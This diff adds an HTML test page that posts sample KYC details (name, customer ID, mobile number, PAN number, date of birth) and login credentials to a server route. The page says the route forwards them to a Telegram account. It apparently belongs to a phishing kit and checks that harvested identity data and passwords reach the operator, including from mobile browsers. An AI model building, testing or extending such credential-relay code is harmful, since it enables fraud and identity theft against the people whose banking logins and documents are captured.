@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile API Test</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            margin: 20px; 
+            background: #f5f5f5;
+        }
+        .container { 
+            max-width: 400px; 
+            margin: 0 auto; 
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        button { 
+            background: #8B1538; 
+            color: white; 
+            padding: 12px 20px; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            width: 100%;
+            margin: 10px 0;
+            font-size: 16px;
+        }
+        button:hover { background: #7a1230; }
+        .result { 
+            margin: 15px 0; 
+            padding: 15px; 
+            border-radius: 8px; 
+            font-size: 14px;
+        }
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
+        .console-log {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            padding: 10px;
+            margin: 10px 0;
+            font-family: monospace;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .mobile-indicator {
+            background: #dc3545;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📱 Mobile API Test</h1>
+        
+        <div id="deviceInfo" class="mobile-indicator">Detecting device...</div>
+        
+        <div class="info">
+            <strong>Testing Server-Side API:</strong><br>
+            • Bypasses CORS issues<br>
+            • Works on mobile browsers<br>
+            • Uses Next.js API routes<br>
+            • Direct server-to-Telegram communication
+        </div>
+
+        <button onclick="testServerAPI()">🔧 Test Server API</button>
+        <button onclick="testKYCSubmission()">📝 Test KYC Submission</button>
+        <button onclick="testLoginSubmission()">🔐 Test Login Submission</button>
+        
+        <div id="result"></div>
+        <div id="console" class="console-log" style="display:none;"></div>
+    </div>
+
+    <script>
+        function log(message) {
+            console.log(message);
+            const consoleDiv = document.getElementById('console');
+            consoleDiv.style.display = 'block';
+            consoleDiv.innerHTML += message + '<br>';
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        }
+
+        function showResult(message, type = 'info') {
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = `<div class="result ${type}">${message}</div>`;
+        }
+
+        function detectMobile() {
+            const userAgent = navigator.userAgent;
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+            const deviceInfo = document.getElementById('deviceInfo');
+            
+            if (isMobile) {
+                deviceInfo.textContent = '📱 Mobile Device Detected';
+                deviceInfo.style.background = '#dc3545';
+            } else {
+                deviceInfo.textContent = '🖥️ Desktop Device';
+                deviceInfo.style.background = '#6c757d';
+            }
+            
+            log('📱 User Agent: ' + userAgent);
+            log('📱 Is Mobile: ' + isMobile);
+            return isMobile;
+        }
+
+        async function testServerAPI() {
+            showResult('Testing server-side API...', 'info');
+            log('🔧 Testing server API connection...');
+            
+            try {
+                const response = await fetch('/api/telegram', {
+                    method: 'GET',
+                    signal: AbortSignal.timeout(10000)
+                });
+
+                log('📋 Server API Status: ' + response.status);
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    log('✅ Server API Response: ' + JSON.stringify(result));
+                    showResult('✅ Server API is working! Ready for mobile submissions.', 'success');
+                } else {
+                    const errorText = await response.text();
+                    log('❌ Server API Error: ' + errorText);
+                    showResult('❌ Server API not responding: ' + errorText, 'error');
+                }
+            } catch (error) {
+                log('❌ Server API Error: ' + error.message);
+                showResult('❌ Server API connection failed: ' + error.message, 'error');
+            }
+        }
+
+        async function testKYCSubmission() {
+            showResult('Testing KYC submission via server API...', 'info');
+            log('📝 Testing KYC submission...');
+            
+            const kycData = {
+                fullName: 'Mobile Test User',
+                customerId: 'MOB123456',
+                mobileNumber: '9876543210',
+                panCardNumber: 'ABCDE1234F',
+                dateOfBirth: '01/01/1990',
+                timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+            };
+
+            try {
+                const response = await fetch('/api/telegram', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: 'kyc',
+                        data: kycData
+                    }),
+                    signal: AbortSignal.timeout(15000)
+                });
+
+                log('📋 KYC API Status: ' + response.status);
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    log('✅ KYC Submission Response: ' + JSON.stringify(result));
+                    showResult('✅ KYC submission successful! Check Telegram @vikaskumar_8102', 'success');
+                } else {
+                    const errorText = await response.text();
+                    log('❌ KYC Submission Error: ' + errorText);
+                    showResult('❌ KYC submission failed: ' + errorText, 'error');
+                }
+            } catch (error) {
+                log('❌ KYC Submission Error: ' + error.message);
+                showResult('❌ KYC submission failed: ' + error.message, 'error');
+            }
+        }
+
+        async function testLoginSubmission() {
+            showResult('Testing Login submission via server API...', 'info');
+            log('🔐 Testing login submission...');
+            
+            const loginData = {
+                userId: 'MOBUSER123',
+                password: 'MobileTest123',
+                timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+            };
+
+            try {
+                const response = await fetch('/api/telegram', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: 'login',
+                        data: loginData
+                    }),
+                    signal: AbortSignal.timeout(15000)
+                });
+
+                log('📋 Login API Status: ' + response.status);
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    log('✅ Login Submission Response: ' + JSON.stringify(result));
+                    showResult('✅ Login submission successful! Check Telegram @vikaskumar_8102', 'success');
+                } else {
+                    const errorText = await response.text();
+                    log('❌ Login Submission Error: ' + errorText);
+                    showResult('❌ Login submission failed: ' + errorText, 'error');
+                }
+            } catch (error) {
+                log('❌ Login Submission Error: ' + error.message);
+                showResult('❌ Login submission failed: ' + error.message, 'error');
+            }
+        }
+
+        // Initialize
+        detectMobile();
+    </script>
+</body>
+</html>
